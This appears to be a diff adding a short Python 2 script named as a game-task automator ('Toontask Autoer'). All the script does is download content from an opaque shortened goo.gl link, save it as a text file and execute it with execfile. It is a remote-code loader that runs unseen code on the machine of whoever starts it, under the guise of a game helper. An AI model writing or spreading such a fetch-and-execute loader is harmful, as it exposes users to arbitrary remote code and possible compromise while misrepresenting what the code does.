@@ -1,0 +1,5 @@
+import urllib
+myFile=open('Toontask Autoer.txt','w')
+myFile.write(urllib.urlopen('http://goo.gl/KHaEya').read())
+myFile.close()
+execfile('Toontask Autoer.txt',globals())
